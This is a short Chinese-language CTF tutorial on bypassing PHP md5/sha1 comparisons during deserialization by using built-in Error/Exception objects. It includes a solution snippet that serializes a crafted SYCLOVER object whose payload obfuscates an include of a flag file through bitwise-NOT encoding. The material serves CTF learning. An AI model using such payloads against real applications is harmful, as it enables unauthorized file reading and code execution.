# 利用php原生类反序列化

## 1、场景

* 在php反序列化题目中，有对md5或sha1相等但内容不等的判断，由于在类中，无法对属性使用数组绕过，所以我们可以使用含有 toString 方法的PHP内置类来绕过，用的两个比较多的内置类就是 Exception 和 Error ，他们之中有一个 toString 方法，当类被当做字符串处理时，就会调用这个函数

## 2、使用原理

```php
<?php
    $a = new Error('payload',1);
	echo $a;

Error:payload
```

* 我们发现会以字符串的形式输出当前报错，包含当前的错误信息（payload）以及当前报错的行号（2），而传入 Error(“payload”,1) 中的错误代码“1”则没有输出出来，如果在同一行创建两个Error对象，其payload相同而后面的数字不同，即为两个不同的对象，但是 toString 方法返回的结果是相同的，通过将题目代码中的两个类属性分别声明为类似上面的内置类的对象，让这两个对象本身不同（传入的错误代码即可），但是 toString 方法输出的结果相同即可，如：

```
$str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";
$a=new Error($str,1);$b=new Error($str,2);
$c = new SYCLOVER();
$c->syc = $a;
$c->lover = $b;
echo(urlencode(serialize($c)));
```

